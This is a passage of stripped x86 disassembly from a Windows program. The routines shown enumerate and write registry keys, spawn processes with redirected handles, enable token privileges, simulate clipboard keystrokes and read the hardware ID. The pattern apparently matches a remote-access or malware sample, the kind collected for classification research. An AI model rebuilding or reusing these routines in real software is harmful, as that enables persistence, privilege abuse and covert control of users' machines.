lea eax [ ebp - 0x1d8 ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48a3c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a450
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x1e
call sub_403af4
mov [ ebp - 0x1e ] 0x3
lea eax [ ebp - 0x28 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x28 ]
call sub_4059dc
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x12 ] 0x54
lea eax [ ebp - 0x22 ]
push eax
call SHFileOperationA
test eax eax
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a457
lea eax [ ebp - 0x28 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48a480
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_48a614
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
call sub_405530
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx esi
mov eax ebx
call sub_421dd8
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax esi
call sub_404650
mov eax ebx
call sub_421770
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a61b
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_405554
retn
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x0
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4218e4
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax ebx
call sub_422068
lea ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax ebx
call sub_422068
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax ebx
call sub_422068
lea ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax ebx
call sub_422068
lea ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax ebx
call sub_422068
mov eax [ ebp - 0x1c ]
push [ eax ]
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x20 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x2c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
mov eax [ ebp - 0x1c ]
mov edx 0xd
call sub_4058e0
inc [ ebp - 0x20 ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_48a72c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a792
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a799
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48a7e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a85d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a864
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48a8ac
push ebp
mov ebp esp
add esp 0xfffffc7c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax ebx
call sub_40a26c
test al al
jne r-xdata
lea eax [ ebp - 0x119 ]
mov edx edi
call sub_40a928
lea eax [ ebp - 0x21e ]
mov edx ebx
call sub_40a928
lea eax [ ebp - 0x323 ]
mov edx esi
call sub_40a928
xor eax eax
push ebp
push sub_48aa9b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x384 ]
xor ecx ecx
mov edx 0xc
call sub_403af4
mov [ ebp - 0x384 ] 0xc
xor eax eax
mov [ ebp - 0x380 ] eax
mov [ ebp - 0x37c ] 0xffffffff
push 0x0
push 0x100
push 0x4
lea eax [ ebp - 0x384 ]
push eax
push 0x3
push 0xc0000000
lea eax [ ebp - 0x21e ]
push eax
call CreateFileA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
push 0x0
push 0x100
push 0x2
lea eax [ ebp - 0x384 ]
push eax
push 0x3
push 0xc0000000
lea eax [ ebp - 0x323 ]
push eax
call CreateFileA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x368 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
mov [ ebp - 0x368 ] 0x44
mov [ ebp - 0x33c ] 0x101
mov [ ebp - 0x338 ] 0x0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x32c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x330 ] eax
lea eax [ ebp - 0x378 ]
push eax
lea eax [ ebp - 0x368 ]
push eax
push 0x0
push 0x0
push 0x110
push 0xffffffff
push 0x0
push 0x0
lea eax [ ebp - 0x119 ]
push eax
push 0x0
call CreateProcessA
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
call sub_404f70
jmp r-xdata
push 0xffffffff
mov eax [ ebp - 0x378 ]
push eax
call WaitForSingleObject
mov eax [ ebp - 0x378 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x374 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
push eax
call CloseHandle
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call CloseHandle
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
sub_48aab0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48ab4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_405530
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ab51
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor eax eax
push ebp
push sub_48ab2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404650
retn
sub_48ab58
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48ac07
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48abe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40a26c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48abec
mov eax [ ebp - 0xc ]
call sub_404650
retn
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call DeleteFileA
sub_48ac14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48ad60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_405530
mov eax 0x320
call sub_402f00
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x28
call GetCurrentProcess
push eax
call OpenProcessToken
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x320
mov eax [ ebp - 0xc ]
push eax
push 0x3
mov eax [ ebp - 0x8 ]
push eax
call GetTokenInformation
test eax eax
jne r-xdata
mov eax r-xdata
call sub_489b40
mov eax 0xff
call sub_402f00
mov ebx eax
mov eax 0xff
call sub_402f00
mov esi eax
mov eax [ ebp - 0xc ]
mov edi [ eax ]
dec edi
test edi edi
jl r-xdata
mov eax r-xdata
call sub_489b40
mov eax ebx
call sub_402f1c
mov eax esi
call sub_402f1c
mov eax [ ebp - 0xc ]
call sub_402f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ad67
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_405554
retn
inc edi
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x1c ] 0xff
mov [ ebp - 0x18 ] 0xff
lea eax [ ebp - 0x18 ]
push eax
push ebx
mov eax [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax * 4 + 0x4 ]
push eax
push 0x0
call LookupPrivilegeNameA
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push ebx
push 0x0
call LookupPrivilegeDisplayNameA
mov eax [ ebp - 0x4 ]
push [ eax ]
lea eax [ ebp - 0x24 ]
mov edx ebx
call sub_405728
push [ ebp - 0x24 ]
push r-xdata
lea eax [ ebp - 0x28 ]
mov edx esi
call sub_405728
push [ ebp - 0x28 ]
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx 0x5
call sub_4058e0
inc [ ebp - 0x14 ]
dec edi
jne r-xdata
sub_48adcc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x114 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
xor edx edx
push ebp
push sub_48ae8c
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
push edx
push eax
push 0x0
call SHGetSpecialFolderLocation
lea eax [ ebp - 0x10d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SHGetPathFromIDListA
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x10d ]
call sub_40aaa8
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x114 ]
mov edx r-xdata
call sub_405974
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax esi
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ae93
lea eax [ ebp - 0x114 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48aea8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48afd6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48afaf
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x5 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x28
call GetCurrentProcess
push eax
call OpenProcessToken
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call GetLastError
test eax eax
sete [ ebp - 0x5 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_48af93
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
call LookupPrivilegeValueA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48afdd
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
mov [ ebp - 0x20 ] 0x1
sub bl 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push 0x10
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call AdjustTokenPrivileges
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub_48afe8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_48b0f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax 0x320
call sub_402f00
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push 0x28
call GetCurrentProcess
push eax
call OpenProcessToken
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x320
push edi
push 0x3
mov eax [ ebp - 0x4 ]
push eax
call GetTokenInformation
test eax eax
jne r-xdata
push 0x1
call Sleep
mov eax 0xff
call sub_402f00
mov ebx eax
mov eax 0xff
call sub_402f00
mov [ ebp - 0x10 ] eax
mov esi [ edi ]
dec esi
test esi esi
jl r-xdata
push 0x1
call Sleep
mov eax ebx
call sub_402f1c
mov eax [ ebp - 0x10 ]
call sub_402f1c
mov eax edi
call sub_402f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b0fa
lea eax [ ebp - 0x20 ]
call sub_405530
retn
inc esi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] 0xff
mov [ ebp - 0x14 ] 0xff
lea eax [ ebp - 0x14 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
lea eax [ eax + eax * 2 ]
lea eax [ edi + eax * 4 + 0x4 ]
push eax
push 0x0
call LookupPrivilegeNameA
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
push ebx
push 0x0
call LookupPrivilegeDisplayNameA
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_405728
mov eax [ ebp - 0x20 ]
mov dl 0x1
call sub_48aea8
inc [ ebp - 0xc ]
dec esi
jne r-xdata
sub_48b104
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48b18f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
xor eax eax
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov ebx eax
push ebx
call LoadLibraryA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b196
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
push ebx
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push ebx
call GetProcAddress
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x1
sub_48b1a0
push ebx
push ecx
mov ebx eax
mov ecx esp
mov edx r-xdata
mov eax r-xdata
call sub_48b104
test al al
je r-xdata
pop edx
pop ebx
retn
cmp bl 0x1
jne r-xdata
push 0x0
call [ esp + 0x4 ]
push 0xffffffff
call [ esp + 0x4 ]
jmp r-xdata
sub_48b1f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48b2dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_405530
xor eax eax
push ebp
push sub_48b2b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf003f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx r-xdata
mov eax ebx
call sub_42230c
test al al
jne r-xdata
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422264
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_405530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422068
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b2e4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48b314
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48b3f3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48b3c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx 0xf003f
mov dl 0x1
mov eax [ r-xdata ]
call sub_421708
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov edx r-xdata
mov eax ebx
call sub_42230c
test al al
jne r-xdata
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx r-xdata
mov eax ebx
call sub_421808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b3fa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48b42c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48b697
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x41
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x41
call keybd_event
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x56
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x56
call keybd_event
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b69e
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x43
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x43
call keybd_event
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x58
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x58
call keybd_event
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x50
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x50
call keybd_event
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x5a
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x5a
call keybd_event
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x59
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x59
call keybd_event
jmp r-xdata
push 0x0
push 0x1
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x1
push 0x45
push 0x46
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x11
call keybd_event
push 0x0
push 0x3
push 0x45
push 0x46
call keybd_event
sub_48b724
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x98 ] edx
mov [ ebp - 0x8c ] edx
mov [ ebp - 0x90 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48b8ba
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48b878
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x87 ]
push eax
call GetCurrentHwProfileA
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
lea edx [ ebp - 0x83 ]
mov ecx 0x27
call sub_4057a0
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
lea eax [ ebp - 0x90 ]
call sub_489bb0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_40a5d4
lea eax [ ebp - 0x8c ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x8c ]
lea ecx [ ebp - 0x8 ]
xor edx edx
call sub_48c91c
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebp - 0xc ]
mov edx 0x3
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
lea eax [ ebp - 0x98 ]
call sub_489bb0
mov eax [ ebp - 0x98 ]
lea edx [ ebp - 0x94 ]
call sub_40a5d4
lea eax [ ebp - 0x94 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x94 ]
lea ecx [ ebp - 0x8 ]
xor edx edx
call sub_48c91c
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
mov eax [ ebp - 0xc ]
mov edx 0x4
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48b8c1
lea eax [ ebp - 0x98 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_48b908
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48bab3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48ba4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
push 0x8
call GetCurrentProcess
push eax
call OpenProcessToken
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_48ba30
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
push 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x12
mov eax [ ebp - 0xc ]
push eax
call GetTokenInformation
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_409b7c
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
mov eax [ ebp - 0x10 ]
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48baba
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x8 ]
push [ eax ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405584
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x4
lea eax [ ebp - 0x14 ]
push eax
push 0x14
mov eax [ ebp - 0xc ]
push eax
call GetTokenInformation
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
